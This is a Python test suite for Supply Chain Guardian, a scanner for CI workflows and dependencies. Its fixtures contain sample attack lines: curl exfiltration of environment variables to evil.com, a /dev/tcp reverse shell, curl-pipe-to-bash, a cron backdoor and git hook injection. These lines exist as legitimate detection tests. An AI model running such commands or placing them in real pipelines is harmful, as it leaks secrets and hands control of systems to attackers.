#!/usr/bin/env python3
"""
Tests for Supply Chain Guardian
"""

import os
import sys
import json
import tempfile
import shutil
import unittest
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from utils.config import ScanConfig
from utils.files import (
    find_workflow_files, extract_uses_statements, extract_run_blocks,
    find_package_files, parse_yaml_safe, read_file_lines
)
from utils.logger import Logger, Colors
from db.attack_db import AttackDatabase


class TestAttackDatabase(unittest.TestCase):
    """Test the attack pattern database."""

    def setUp(self):
        self.db = AttackDatabase()

    def test_loads_attacks(self):
        """DB should load 60+ attack patterns."""
        self.assertGreaterEqual(self.db.total_attacks(), 55)

    def test_get_by_category(self):
        """Should filter by category."""
        actions = self.db.get_by_category("actions_compromise")
        self.assertGreater(len(actions), 0)
        for a in actions:
            self.assertEqual(a.category, "actions_compromise")

    def test_get_compromised_shas(self):
        """Should return known compromised SHAs."""
        shas = self.db.get_compromised_shas()
        self.assertIn("0e58ed8671d6b60d0890c21b07f8835ace038e67", shas)

    def test_get_compromised_actions(self):
        """Should return known compromised action names."""
        actions = self.db.get_compromised_actions()
        self.assertIn("tj-actions/changed-files", actions)
        self.assertIn("reviewdog/action-setup", actions)

    def test_get_malicious_packages(self):
        """Should return malicious packages by ecosystem."""
        pkgs = self.db.get_malicious_packages()
        self.assertIn("npm", pkgs)
        self.assertIn("pypi", pkgs)
        self.assertIn("flatmap-stream", pkgs["npm"])

    def test_get_suspicious_domains(self):
        """Should return attacker-controlled domains."""
        domains = self.db.get_suspicious_domains()
        self.assertIn("ngrok.io", domains)

    def test_litellm_attack_present(self):
        """LiteLLM credential stealer should be in the database."""
        found = False
        for attack in self.db.attacks:
            if "litellm" in attack.name.lower():
                found = True
                self.assertEqual(attack.severity, "critical")
                self.assertIn("wheel", attack.description.lower())
                break
        self.assertTrue(found, "LiteLLM attack pattern not found in database")

    def test_attack_pattern_fields(self):
        """Every attack should have required fields."""
        for attack in self.db.attacks:
            self.assertTrue(attack.id, f"Missing id for {attack.name}")
            self.assertTrue(attack.name, f"Missing name for {attack.id}")
            self.assertIn(attack.severity, ("critical", "high", "medium", "low", "info"))
            self.assertTrue(attack.description, f"Missing description for {attack.id}")


class TestScanConfig(unittest.TestCase):
    """Test configuration management."""

    def test_default_config(self):
        """Default config should have sensible defaults."""
        config = ScanConfig()
        self.assertEqual(config.scan_mode, "standard")
        self.assertEqual(config.fail_on_severity, "high")
        self.assertTrue(config.scan_workflows)
        self.assertTrue(config.scan_dependencies)
        self.assertTrue(config.scan_secrets)

    def test_from_environment(self):
        """Config should read from environment variables."""
        os.environ["INPUT_SCAN_MODE"] = "paranoid"
        os.environ["INPUT_FAIL_ON_SEVERITY"] = "critical"
        os.environ["INPUT_SCAN_WORKFLOWS"] = "true"
        os.environ["INPUT_SLACK_WEBHOOK_URL"] = "https://hooks.slack.com/test"

        config = ScanConfig.from_environment()
        self.assertEqual(config.scan_mode, "paranoid")
        self.assertEqual(config.fail_on_severity, "critical")
        self.assertEqual(config.slack_webhook_url, "https://hooks.slack.com/test")

        # Cleanup
        for key in ["INPUT_SCAN_MODE", "INPUT_FAIL_ON_SEVERITY", "INPUT_SCAN_WORKFLOWS", "INPUT_SLACK_WEBHOOK_URL"]:
            os.environ.pop(key, None)

    def test_path_exclusion(self):
        """Should exclude configured paths."""
        config = ScanConfig(exclude_paths=["vendor", "node_modules"])
        self.assertFalse(config.should_scan_path("/app/vendor/lib.py"))
        self.assertFalse(config.should_scan_path("/app/node_modules/pkg/index.js"))
        self.assertTrue(config.should_scan_path("/app/src/main.py"))


class TestFileUtils(unittest.TestCase):
    """Test file utility functions."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_find_workflow_files(self):
        """Should find .yml files in .github/workflows."""
        wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(wf_dir)
        open(os.path.join(wf_dir, "ci.yml"), "w").close()
        open(os.path.join(wf_dir, "deploy.yaml"), "w").close()
        open(os.path.join(wf_dir, "README.md"), "w").close()

        files = find_workflow_files(self.tmpdir)
        self.assertEqual(len(files), 2)

    def test_extract_uses_statements(self):
        """Should extract uses: statements with line numbers."""
        wf_path = os.path.join(self.tmpdir, "test.yml")
        with open(wf_path, "w") as f:
            f.write("""name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v3
      - run: echo hello
      - uses: owner/action@abc123def456abc123def456abc123def456abcd
""")

        statements = extract_uses_statements(wf_path)
        self.assertEqual(len(statements), 3)
        self.assertEqual(statements[0]["action_ref"], "actions/checkout@v4")
        self.assertEqual(statements[0]["line"], 7)

    def test_extract_run_blocks(self):
        """Should extract run: blocks."""
        wf_path = os.path.join(self.tmpdir, "test.yml")
        with open(wf_path, "w") as f:
            f.write("""name: test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
      - run: |
          npm install
          npm test
""")

        blocks = extract_run_blocks(wf_path)
        self.assertGreaterEqual(len(blocks), 1)

    def test_find_package_files(self):
        """Should find package manifests."""
        for f in ["package.json", "requirements.txt", "go.mod"]:
            open(os.path.join(self.tmpdir, f), "w").close()

        result = find_package_files(self.tmpdir)
        self.assertEqual(len(result["npm"]), 1)
        self.assertEqual(len(result["python"]), 1)
        self.assertEqual(len(result["go"]), 1)


class TestCompromisedActionScanner(unittest.TestCase):
    """Test the Compromised Action Scanner."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_compromised_sha(self):
        """Should detect known compromised SHA."""
        from scanners.compromised_action_scanner import CompromisedActionScanner

        with open(os.path.join(self.wf_dir, "ci.yml"), "w") as f:
            f.write("""name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67
""")

        scanner = CompromisedActionScanner(self.config, self.db)
        findings = scanner.scan()

        critical = [f for f in findings if f["severity"] == "critical"]
        self.assertGreater(len(critical), 0)

    def test_detect_mutable_tag(self):
        """Should flag mutable tag references."""
        from scanners.compromised_action_scanner import CompromisedActionScanner

        with open(os.path.join(self.wf_dir, "ci.yml"), "w") as f:
            f.write("""name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: some-org/some-action@v1
""")

        scanner = CompromisedActionScanner(self.config, self.db)
        findings = scanner.scan()

        mutable = [f for f in findings if "mutable" in f["title"].lower()]
        self.assertGreater(len(mutable), 0)


class TestSecretScanner(unittest.TestCase):
    """Test the Secret Scanner."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_aws_key(self):
        """Should detect hardcoded AWS key."""
        from scanners.secret_scanner import SecretScanner

        with open(os.path.join(self.wf_dir, "deploy.yml"), "w") as f:
            f.write("""name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
          aws s3 sync . s3://bucket
""")

        scanner = SecretScanner(self.config, self.db)
        findings = scanner.scan()

        aws_findings = [f for f in findings if "AWS" in f["title"]]
        self.assertGreater(len(aws_findings), 0)

    def test_detect_exfil_pattern(self):
        """Should detect credential exfiltration patterns."""
        from scanners.secret_scanner import SecretScanner

        with open(os.path.join(self.wf_dir, "hack.yml"), "w") as f:
            f.write("""name: Hack
on: push
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - run: |
          printenv | curl -X POST https://evil.com/steal -d @-
""")

        scanner = SecretScanner(self.config, self.db)
        findings = scanner.scan()

        exfil = [f for f in findings if "exfil" in f["title"].lower()]
        self.assertGreater(len(exfil), 0)


class TestPwnRequestScanner(unittest.TestCase):
    """Test the Pwn Request Scanner."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_pwn_request(self):
        """Should detect dangerous pull_request_target + checkout."""
        from scanners.pwn_request_scanner import PwnRequestScanner

        with open(os.path.join(self.wf_dir, "pr.yml"), "w") as f:
            f.write("""name: PR Check
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
""")

        scanner = PwnRequestScanner(self.config, self.db)
        findings = scanner.scan()

        pwn = [f for f in findings if "pwn" in f["title"].lower() or "pull_request_target" in f["title"].lower()]
        self.assertGreater(len(pwn), 0)

    def test_detect_script_injection(self):
        """Should detect script injection via PR title."""
        from scanners.pwn_request_scanner import PwnRequestScanner

        with open(os.path.join(self.wf_dir, "greet.yml"), "w") as f:
            f.write("""name: Greet
on:
  pull_request:
    types: [opened]
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Thanks for PR: ${{ github.event.pull_request.title }}"
""")

        scanner = PwnRequestScanner(self.config, self.db)
        findings = scanner.scan()

        injection = [f for f in findings if "injection" in f["title"].lower()]
        self.assertGreater(len(injection), 0)


class TestNetworkScanner(unittest.TestCase):
    """Test the Network Scanner."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_reverse_shell(self):
        """Should detect reverse shell patterns."""
        from scanners.network_scanner import NetworkScanner

        with open(os.path.join(self.wf_dir, "evil.yml"), "w") as f:
            f.write("""name: Evil
on: push
jobs:
  hack:
    runs-on: ubuntu-latest
    steps:
      - run: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
""")

        scanner = NetworkScanner(self.config, self.db)
        findings = scanner.scan()

        shells = [f for f in findings if "reverse shell" in f["title"].lower()]
        self.assertGreater(len(shells), 0)


class TestDependencyScanner(unittest.TestCase):
    """Test the Dependency Scanner."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_malicious_npm(self):
        """Should detect known malicious npm packages."""
        from scanners.dependency_scanner import DependencyScanner

        with open(os.path.join(self.tmpdir, "package.json"), "w") as f:
            json.dump({
                "name": "test-app",
                "dependencies": {
                    "express": "^4.18.0",
                    "flatmap-stream": "^0.1.0",
                }
            }, f)

        scanner = DependencyScanner(self.config, self.db)
        findings = scanner.scan()

        malicious = [f for f in findings if "malicious" in f["title"].lower()]
        self.assertGreater(len(malicious), 0)

    def test_detect_dependency_confusion(self):
        """Should detect --extra-index-url."""
        from scanners.dependency_scanner import DependencyScanner

        with open(os.path.join(self.tmpdir, "requirements.txt"), "w") as f:
            f.write("--extra-index-url https://internal.pypi.org/simple\nrequests==2.31.0\n")

        scanner = DependencyScanner(self.config, self.db)
        findings = scanner.scan()

        confusion = [f for f in findings if "confusion" in f["title"].lower()]
        self.assertGreater(len(confusion), 0)


class TestPermissionScanner(unittest.TestCase):
    """Test the Permission Scanner."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.wf_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.wf_dir)
        self.db = AttackDatabase()
        self.config = ScanConfig(workspace_dir=self.tmpdir)

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_detect_missing_permissions(self):
        """Should flag missing permissions block."""
        from scanners.permission_scanner import PermissionScanner

        with open(os.path.join(self.wf_dir, "ci.yml"), "w") as f:
            f.write("""name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
""")

        scanner = PermissionScanner(self.config, self.db)
        findings = scanner.scan()

        perm = [f for f in findings if "permission" in f["title"].lower()]
        self.assertGreater(len(perm), 0)


class TestReporters(unittest.TestCase):
    """Test reporter modules."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.report_data = {
            "version": "1.0.0",
            "scan_timestamp": "2025-03-25T00:00:00Z",
            "scan_duration_seconds": 2.5,
            "scan_mode": "standard",
            "repository": "test/repo",
            "commit_sha": "abc123",
            "ref": "refs/heads/main",
            "event": "push",
            "overall_status": "FAILED",
            "summary": {
                "total_findings": 3,
                "critical": 1,
                "high": 1,
                "medium": 1,
                "low": 0,
                "info": 0,
            },
            "findings": [
                {
                    "id": "SCA-001",
                    "scanner": "compromised_actions",
                    "severity": "critical",
                    "title": "Compromised SHA detected",
                    "description": "Test finding",
                    "file": ".github/workflows/ci.yml",
                    "line": 10,
                    "remediation": "Update action",
                },
            ],
            "attack_database_version": "2025.03.1",
            "attacks_checked": 60,
        }

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def test_json_reporter(self):
        """JSON reporter should write valid JSON."""
        from reporters.json_reporter import JsonReporter

        output_path = os.path.join(self.tmpdir, "report.json")
        result = JsonReporter.write_report(self.report_data, output_path)

        self.assertTrue(result)
        self.assertTrue(os.path.exists(output_path))

        with open(output_path) as f:
            data = json.load(f)
        self.assertEqual(data["overall_status"], "FAILED")

    def test_sarif_reporter(self):
        """SARIF reporter should generate valid SARIF."""
        from reporters.sarif_reporter import SarifReporter

        output_path = os.path.join(self.tmpdir, "report.sarif")
        result = SarifReporter.write_report(self.report_data, output_path)

        self.assertTrue(result)
        self.assertTrue(os.path.exists(output_path))

        with open(output_path) as f:
            sarif = json.load(f)
        self.assertEqual(sarif["version"], "2.1.0")
        self.assertEqual(len(sarif["runs"]), 1)
        self.assertGreater(len(sarif["runs"][0]["results"]), 0)

    def test_table_reporter(self):
        """Table reporter should not crash."""
        from reporters.table_reporter import TableReporter

        # Should not raise
        TableReporter.print_findings_table(
            self.report_data["findings"],
            {"test_scanner": {"status": "completed", "findings_count": 1}},
            self.report_data,
        )


class TestSlackAlerter(unittest.TestCase):
    """Test Slack alerter message building."""

    def test_build_payload(self):
        """Should build a valid Slack payload."""
        from alerting.slack_alerter import SlackAlerter

        alerter = SlackAlerter("https://hooks.slack.com/test")
        payload = alerter._build_payload({
            "overall_status": "FAILED",
            "summary": {"critical": 2, "high": 1, "medium": 0, "low": 0, "total_findings": 3},
            "repository": "test/repo",
            "commit_sha": "abc123",
            "event": "push",
            "scan_mode": "standard",
            "findings": [
                {"severity": "critical", "title": "Bad thing", "file": "ci.yml", "line": 1},
            ],
            "version": "1.0.0",
            "attack_database_version": "2025.03.1",
            "attacks_checked": 60,
        })

        self.assertIn("text", payload)
        self.assertIn("blocks", payload)
        self.assertIn("FAILED", payload["text"])


class TestTeamsAlerter(unittest.TestCase):
    """Test Teams alerter message building."""

    def test_build_payload(self):
        """Should build a valid Teams Adaptive Card payload."""
        from alerting.teams_alerter import TeamsAlerter

        alerter = TeamsAlerter("https://outlook.office.com/webhook/test")
        payload = alerter._build_payload({
            "overall_status": "FAILED",
            "summary": {"critical": 1, "high": 0, "medium": 0, "low": 0, "total_findings": 1},
            "repository": "test/repo",
            "commit_sha": "abc123",
            "event": "push",
            "scan_mode": "standard",
            "findings": [],
            "version": "1.0.0",
            "attack_database_version": "2025.03.1",
            "attacks_checked": 60,
        })

        self.assertIn("attachments", payload)
        card = payload["attachments"][0]["content"]
        self.assertEqual(card["type"], "AdaptiveCard")


# ─── Behavioral Scanner Tests ──────────────────────────────────────

class TestBehavioralScanner(unittest.TestCase):
    """Test the behavioral / predictive scanner."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.workflows_dir = os.path.join(self.tmpdir, ".github", "workflows")
        os.makedirs(self.workflows_dir)

        self.config = ScanConfig(
            workspace_dir=self.tmpdir,
            scan_mode="standard",
            fail_on_severity="high",
        )
        self.db = AttackDatabase()

    def tearDown(self):
        shutil.rmtree(self.tmpdir)

    def _write_workflow(self, filename, content):
        path = os.path.join(self.workflows_dir, filename)
        with open(path, "w") as f:
            f.write(content)
        return path

    def test_detect_base64_pipe_to_shell(self):
        """Should detect base64 decoded payload piped to shell."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("evil.yml", """
name: Evil
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "aGVsbG8=" | base64 -d | bash
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        titles = [f["title"] for f in findings]
        self.assertTrue(
            any("base64" in t.lower() for t in titles),
            f"Expected a base64-related finding but got: {titles}"
        )

    def test_detect_curl_pipe_to_shell(self):
        """Should detect curl piped to shell."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("curl_sh.yml", """
name: Fetch and exec
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sL https://evil.com/setup.sh | bash
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        critical = [f for f in findings if f["severity"] == "critical"]
        self.assertGreater(len(critical), 0, "curl|sh should be critical")

    def test_detect_env_dump(self):
        """Should detect environment variable dumping."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("env_dump.yml", """
name: Dump
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: env | sort > /tmp/envvars.txt
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        cred_findings = [f for f in findings if "SCA-BHV-CRED" in f["id"]]
        self.assertGreater(len(cred_findings), 0, "env dump should be detected")

    def test_detect_cron_injection(self):
        """Should detect cron job injection."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("cron.yml", """
name: Persist
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: crontab -l; echo '*/5 * * * * /tmp/backdoor.sh' | crontab -
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        persist = [f for f in findings if "SCA-BHV-PERS" in f["id"]]
        self.assertGreater(len(persist), 0, "cron injection should be detected")

    def test_detect_privileged_docker(self):
        """Should detect privileged Docker execution."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("docker.yml", """
name: Docker
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: docker run --privileged evil/image
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        self.assertTrue(
            any("privileged" in f["title"].lower() for f in findings),
            "Privileged docker should be detected"
        )

    def test_detect_write_all_permissions(self):
        """Should detect write-all permissions."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("perms.yml", """
name: Overprivileged
on: push
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "hello"
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        perm = [f for f in findings if "write-all" in f["title"]]
        self.assertGreater(len(perm), 0, "write-all should be detected")

    def test_clean_workflow_minimal_findings(self):
        """A clean workflow should produce minimal behavioral findings."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("clean.yml", """
name: Clean CI
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@abc123
      - run: echo "all good"
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        critical = [f for f in findings if f["severity"] == "critical"]
        self.assertEqual(len(critical), 0, "Clean workflow should have no critical findings")

    def test_detect_git_hook_injection(self):
        """Should detect git hook injection."""
        from scanners.behavioral_scanner import BehavioralScanner

        self._write_workflow("hook.yml", """
name: Hook
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo '#!/bin/sh' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit
""")
        scanner = BehavioralScanner(self.config, self.db)
        findings = scanner.scan()
        persist = [f for f in findings if "SCA-BHV-PERS" in f["id"]]
        self.assertGreater(len(persist), 0, "git hook injection should be detected")


if __name__ == "__main__":
    unittest.main()
